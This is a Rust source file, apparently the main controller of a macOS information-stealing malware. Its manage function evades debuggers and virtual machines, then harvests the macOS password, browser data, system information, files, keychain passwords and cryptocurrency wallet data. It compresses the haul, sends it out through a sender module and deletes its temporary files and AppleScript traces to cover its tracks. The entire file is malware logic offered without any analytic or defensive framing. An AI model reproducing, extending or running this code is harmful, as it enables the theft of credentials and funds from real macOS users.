use crate::tools;
use crate::antivm;
use crate::system_info::SystemInfo;
use crate::browsers::Browsers;
use crate::sender::Sender;
use crate::wallets::Wallets;
use anyhow::Result;

pub struct Controller {
    encryption_key: String,
    system: SystemInfo,
    browsers: Browsers,
    sender: Sender,
    wallets: Wallets,
}

impl Controller {
    pub fn new(encryption_key: String) -> Self {
        let system = SystemInfo::new(encryption_key.clone());
        let browsers = Browsers::new();
        let sender = Sender::new();
        let wallets = Wallets::new();
        Controller {
            encryption_key,
            system,
            browsers,
            sender,
            wallets,
        }
    }

    pub fn manage(&self) -> Result<()> {
        if antivm::is_debugger_attached() {
            return Ok(());
        }

        if antivm::check_vm()? {
            return Ok(());
        }

        let temp_path = tools::initialize_global_tmp_path()?;
        self.system.get_macos_password()?;

        self.browsers.collect_all_data(&temp_path)?;

        futures::executor::block_on(self.system.collect_system_info(&temp_path))?;

        self.system.file_grab(&temp_path)?;

        self.system.dump_keychain_passwords(&temp_path)?;

        self.wallets.collect_wallet_data(&temp_path)?;

        tools::compress_folder(&temp_path)?;

        self.sender.send_data(&temp_path)?;

        tools::remove_item_at_path(&temp_path)?;

        let apple_script_path = "/tmp/tempAppleScript.scpt";
        tools::remove_item_at_path(apple_script_path)?;

        let source_temp_path = format!("{}/tempFolder-32555443", tools::get_home_directory());
        tools::remove_item_at_path(&source_temp_path)?;

        Ok(())
    }
} 